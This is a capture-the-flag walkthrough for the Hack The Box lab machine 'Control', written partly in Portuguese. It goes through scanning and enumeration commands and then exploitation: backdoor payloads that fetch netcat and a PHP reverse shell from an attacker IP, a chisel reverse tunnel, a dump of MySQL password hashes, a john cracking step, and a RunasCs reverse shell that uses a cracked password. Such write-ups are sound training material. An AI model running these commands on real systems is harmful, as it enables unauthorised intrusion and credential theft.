## Enumeration

### nmap_enum


```
sudo nmap_enum control.htb | tee nmap_output.txt
```

![[../../../media/Pasted image 20240601174603.png]]

### nmap full tcp scan

```
sudo -sS -p- --max-retries 0 -Pn -T5 control.htb
```

![[../../../media/Pasted image 20240601174420.png]]

Entao temos 
- [ ] HTTP
- [x] RPC
- [x] Mysql


### UDP scan

![[../../../media/Pasted image 20240601170822.png]]

### RPC

```
rpcclient -U 'guest' -N 10.10.10.167

rpcclient -U '' -N 10.10.10.167
```

![[../../../media/Pasted image 20240601174954.png]]

### mysql

```
nmap -Pn -sV -p 3306 --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_3306_mysql_nmap.txt" control.htb
```

![[../../../media/Pasted image 20240601183137.png]]

### HTTP


Headers

![[../../../media/Pasted image 20240601174734.png]]

Search for CVE

```
searchsploit fidelity
```

![[../../../media/Pasted image 20240601171049.png]]

```
searchsploit PHP 7.3.7
```
![[../../../media/Pasted image 20240601175248.png]]

URL Brute Force

```
feroxbuster -u http://control.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "php,txt,html"
```

Verificar os cabecalhos da pagina:

```
curl -v http://control.htb -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" -o /dev/null
```

![[../../../media/Pasted image 20240601182612.png]]

Verificar links escondidos:

```
urlExtract -r 4 http://control.htb
```

![[../../../media/Pasted image 20240601182706.png]]

Enumeracao de subdominios e virtual hosts:

```
ffuf -c -ic -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.control.htb" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" -u http://control.htb -fw 157
```

![[../../../media/Pasted image 20240601183544.png]]
scanning

```
nikto -host http://control.htb -T x 6 -useragent "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" | tee nikto_output.txt
```

![[../../../media/Pasted image 20240601183701.png]]

Fuzzing de parametros:

```
seq 1 1000 | ffuf -u http://control.htb/view_product.php?FUZZ=ID -w -:ID -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1339 -x http://127.0.0.1:8080 -mode pitchfork
```

![[../../../media/Pasted image 20240601204949.png]]

![[../../../media/Pasted image 20240601205029.png]]

## Exploitation

Payloads que testei:

```
http://control.htb/backdoor.php?cmd=certutil%20-urlcache%20-f%20http://10.10.14.10/nc64.exe%20nc.exe

http://control.htb/backdoor.php?cmd=curl%2010.10.14.10/nc64.exe%20-o%20nc.exe
```

![[../../../media/Pasted image 20240601215324.png]]

Alterei o payload e subi este para a maquina alvo:

![[../../../media/Pasted image 20240603115521.png]]


```
http://control.htb/backdoor.php?cmd=curl%2010.10.14.10/new_php_reverse_shell.php%20-o%20p.php
```


```
curl http://control.htb/uploads/p.php
```

![[../../../media/Pasted image 20240603115622.png]]

![[../../../media/Pasted image 20240603115551.png]]

Identifiquei um entry point bem interessante que foi pelo mysql... entao fiz o port forwarding:


```
curl 10.10.14.10/chisel.exe -o c.exe
```
```
c.exe client 10.10.14.10:7777 R:3306:socks
```

![[../../../media/Pasted image 20240603115859.png]]

```
./chisel server -p 7777 --reverse --socks5
```

![[../../../media/Pasted image 20240603115928.png]]

Entao vamos acessar o mysql:

```
proxychains mysql -u manager -h 127.0.0.1 -p
```

![[../../../media/Pasted image 20240603120046.png]]

```
use mysql
show tables;
select * from user;
select concat(User,':',Password) from user;
```


![[../../../media/Pasted image 20240603120210.png]]

Entao aqui ja temos a credencial do usuario hector:

```
john -w=/usr/share/wordlists/rockyou.txt hash_hector.txt
```

![[../../../media/Pasted image 20240603120256.png]]

Utilizando a ferramenta do RunasCs.exe podemos acessar essa maquina com o usuario Hector:

```
ra.exe hector l33th4x0rhector -r 10.10.14.10:8083 cmd
```

![[../../../media/Pasted image 20240603120542.png]]

![[../../../media/Pasted image 20240603120624.png]]

 